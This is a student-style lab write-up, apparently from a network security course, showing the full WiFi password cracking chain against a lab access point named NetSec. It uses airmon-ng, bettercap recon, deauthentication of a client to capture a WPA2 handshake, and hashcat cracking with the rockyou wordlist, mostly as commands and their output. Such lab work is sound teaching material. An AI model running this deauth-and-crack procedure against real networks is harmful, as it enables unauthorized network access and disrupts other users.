# Password Cracking

## Card Mode
The card was already in monitor mode from the previous password cracking
exercise, but I for some reason `bettercap` wasn't getting anything from `wifi.show` at first. 
When I put the card back into managed mode and then into monitor mode again, it started working as I expected.

```
 $ sudo iwconfig mode Managed
 $ sudo airmon-ng check kill
 $ sudo airmon-ng start wlan0
```

## `bettercap`

```
 $ sudo bettercap --iface wlan0mon
 > wifi.recon on
...
[18:16:35] [wifi.ap.new] wifi access point NetSec (-35 dBm) detected as 28:87:ba:75:7e:93.
...
 > wifi.show

┌─────────┬───────────────────┬────────────────┬──────────────────┬─────┬─────┬─────────┬────────┬────────┬──────────┐
│ RSSI ▴  │       BSSID       │      SSID      │    Encryption    │ WPS │ Ch  │ Clients │  Sent  │ Recvd  │   Seen   │
├─────────┼───────────────────┼────────────────┼──────────────────┼─────┼─────┼─────────┼────────┼────────┼──────────┤
│ -35 dBm │ 28:87:ba:75:7e:93 │ NetSec         │ WPA2 (CCMP, PSK) │ 2.0 │ 48  │ 1       │ 4.3 kB │ 54 B   │ 18:24:30 │
│                                                      ...                                                           │
│                                                      ...                                                           │
│                                                      ...                                                           │
└─────────┴───────────────────┴────────────────┴──────────────────┴─────┴─────┴─────────┴────────┴────────┴──────────┘

 > wifi.recon 28:87:ba:75:7e:93
[18:58:15] [wifi.client.new] new station 70:f7:54:ff:1c:59 (AMPAK Technology,Inc.) detected for NetSec (28:87:ba:75:7e:93)

 > wifi.show

28:87:ba:75:7e:93 clients:

┌─────────┬───────────────────┬────┬────────┬───────┬──────────┐
│ RSSI ▴  │       BSSID       │ Ch │  Sent  │ Recvd │   Seen   │
├─────────┼───────────────────┼────┼────────┼───────┼──────────┤
│ -39 dBm │ 00:c0:ca:b0:61:b9 │ 48 │ 112 B  │ 504 B │ 18:35:20 │
│ -45 dBm │ 70:f7:54:ff:1c:59 │ 48 │ 5.1 kB │ 672 B │ 18:36:09 │
└─────────┴───────────────────┴────┴────────┴───────┴──────────┘

 > wifi.deauth 70:f7:54:ff:1c:59
[19:06:08] [wifi.client.handshake] captured 70:f7:54:ff:1c:59 -> NetSec (28:87:ba:75:7e:93) WPA2 handshake (half) to /root/bettercap-wifi-handshakes.pcap
[19:06:08] [wifi.client.handshake] captured 70:f7:54:ff:1c:59 -> NetSec (28:87:ba:75:7e:93) WPA2 handshake (half) to /root/bettercap-wifi-handshakes.pcap
[19:06:08] [wifi.client.handshake] captured 70:f7:54:ff:1c:59 -> NetSec (28:87:ba:75:7e:93) WPA2 handshake (full) to /root/bettercap-wifi-handshakes.pcap

 > exit
```
## `hcx` and `hashcat`
```
 $ sudo cp bettercap-wifi-handshakes.pcap .
 $ hcxpcapngtool bettercap-wifi-handshakes.pcap -o hash
hcxpcapngtool 6.2.7 reading from bettercap-wifi-handshakes.pcap...

summary capture file
--------------------
file name................................: bettercap-wifi-handshakes.pcap
version (pcap/cap).......................: 2.4 (very basic format without any additional information)
timestamp minimum (GMT)..................: 18.05.2024 18:58:15
timestamp maximum (GMT)..................: 18.05.2024 19:06:13
used capture interfaces..................: 1
link layer header type...................: DLT_IEEE802_11_RADIO (127)
endianness (capture system)...............: little endian
packets inside...........................: 18
packets received on 5 GHz................: 18
ESSID (total unique).....................: 1
BEACON (total)...........................: 1
ACTION (total)...........................: 9
ASSOCIATIONREQUEST (total)...............: 1
ASSOCIATIONREQUEST (PSK).................: 1
EAPOL messages (total)...................: 7
EAPOL RSN messages.......................: 7
EAPOLTIME gap (measured maximum usec)....: 1344
EAPOL ANONCE error corrections (NC)......: not detected
EAPOL M1 messages (total)................: 2
EAPOL M2 messages (total)................: 2
EAPOL M3 messages (total)................: 2
EAPOL M4 messages (total)................: 1
EAPOL pairs (total)......................: 8
EAPOL pairs (best).......................: 1
EAPOL pairs written to 22000 hash file...: 1 (RC checked)
EAPOL M32E2 (authorized).................: 1

frequency statistics from radiotap header (frequency: received packets)
-----------------------------------------------------------------------
 5240: 18

Warning: out of sequence timestamps!
This dump file contains frames with out of sequence timestamps.
That is a bug of the capturing tool.

Information: limited dump file format detected!
This file format is a very basic format to save captured network data.
It is recommended to use PCAP Next Generation dump file format (or pcapng for short) instead.
The PCAP Next Generation dump file format is an attempt to overcome the limitations
of the currently widely used (but limited) libpcap (cap, pcap) format.
https://www.wireshark.org/docs/wsug_html_chunked/AppFiles.html#ChAppFilesCaptureFilesSection
https://github.com/pcapng/pcapng

Information: missing frames!
This dump file does not contain undirected proberequest frames.
An undirected proberequest may contain information about the PSK.
It always happens if the capture file was cleaned or
it could happen if filter options are used during capturing.
That makes it hard to recover the PSK.


session summary
---------------
processed cap files...................: 1

 $ cat hash
WPA*02*9b76ab0370df3edfba60aa1b710fa1d1*2887ba757e93*70f754ff1c59*4e6574536563*6dd1e3804119dbd3f644d568fd3a01911202e3c04b13a0638f60692520cd5d9d*0103007502010a00000000000000000001f0009806c80f02dccda6cee2e553e535ddb668774f3893b67888171ebc16257e000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001630140100000fac040100000fac040100000fac028000*02 

 $ hashcat -m 2500 hash /usr/share/wordlists/rockyou.txt.qz

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Xeon(R) CPU E3-1241 v3 @ 3.50GHz, 6915/13895 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

The plugin 2500 is deprecated and was replaced with plugin 22000. For more details, please read: https://hashcat.net/forum/thread-10253.html

Started: Sat May 18 19:23:58 2024
Stopped: Sat May 18 19:23:59 2024
[1]    192526 exit 255   hashcat -m 2500 hash /usr/share/wordlists/rockyou.txt.gz

 $ hashcat -m 22000 hash /usr/share/wordlists/rockyou.txt.gz
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-haswell-Intel(R) Xeon(R) CPU E3-1241 v3 @ 3.50GHz, 6915/13895 MB (2048 MB allocatable), 8MCU

Minimum password length supported by kernel: 8
Maximum password length supported by kernel: 63

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 2 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt.gz
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

9b76ab0370df3edfba60aa1b710fa1d1:2887ba757e93:70f754ff1c59:NetSec:crackme1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 22000 (WPA-PBKDF2-PMKID+EAPOL)
Hash.Target......: hash
Time.Started.....: Sat May 18 19:24:58 2024 (7 mins, 13 secs)
Time.Estimated...: Sat May 18 19:32:11 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt.gz)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:    13632 H/s (9.16ms) @ Accel:64 Loops:1024 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 8938029/14344385 (62.31%)
Rejected.........: 3033645/8938029 (33.94%)
Restore.Point....: 8937451/14344385 (62.31%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: craetive -> cracker82
Hardware.Mon.#1..: Temp: 80c Util:  0%

Started: Sat May 18 19:24:13 2024
Stopped: Sat May 18 19:32:13 2024

 $ hashcat -m 22000 --show hash
9b76ab0370df3edfba60aa1b710fa1d1:2887ba757e93:70f754ff1c59:NetSec:crackme1
```

## Connecting
`nmcli` wouldn't connect to `NetSec` until after I did the `nmcli device wifi` command

```
 $ sudo airmon-ng stop wlan0mon

PHY     Interface       Driver          Chipset

phy0    wlan0mon        mt76x2u         MediaTek Inc. MT7612U 802.11a/b/g/n/ac
                (mac80211 station mode vif enabled on [phy0]wlan0)
                (mac80211 monitor mode vif disabled for [phy0]wlan0mon)

 $ sudo systemctl start NetworkManager
 $ nmcli device wifi
IN-USE  BSSID              SSID            MODE   CHAN  RATE        SIGNAL  BARS  SECURITY
        28:87:BA:75:7E:93  NetSec          Infra  48    270 Mbit/s  100     ▂▄▆█  WPA2
...

 $ sudo nmcli device wifi connect NetSec password crackme1
Device 'wlan0' successfully activated with '52796feb-4833-46c6-b196-8e18e42f8bb6'.
```

![Connected to NetSec](./img/connection.png)

# Nmap

# RTSP Stream
